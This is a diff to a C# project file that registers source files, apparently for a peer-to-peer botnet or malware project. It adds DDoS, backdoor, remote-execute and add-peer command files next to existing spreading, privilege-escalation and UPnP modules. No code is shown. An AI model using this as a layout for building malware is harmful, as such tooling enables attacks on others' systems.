@@ -100,7 +100,12 @@
     <Compile Include="Network\Protocol\Peers\PeerList.cs" />
     <Compile Include="Network\SFP\F.cs" />
     <Compile Include="RemoveAttribute.cs" />
+    <Compile Include="REPL\DebugCommand.cs" />
+    <Compile Include="REPL\ExecuteCommand.cs" />
+    <Compile Include="REPL\AddPeerCommand.cs" />
     <Compile Include="REPL\CommandReader.cs" />
+    <Compile Include="REPL\DDoSCommand.cs" />
+    <Compile Include="REPL\BackdoorCommand.cs" />
     <Compile Include="Spread\PrivilegeScalation.cs" />
     <Compile Include="System\CommandExecutor.cs" />
     <Compile Include="System\DateTimeProvider.cs" />
@@ -137,6 +142,7 @@
     <Compile Include="Upnp\UpnpSearcher.cs" />
     <Compile Include="Utils\Action.cs" />
     <Compile Include="Utils\BufferUtils.cs" />
+    <Compile Include="Utils\MonoOptions.cs" />
     <Compile Include="Utils\IPAddressExtensions.cs" />
     <Compile Include="Network\Comunication\ReplyWaitManager.cs" />
     <Compile Include="Utils\PoW.cs" />
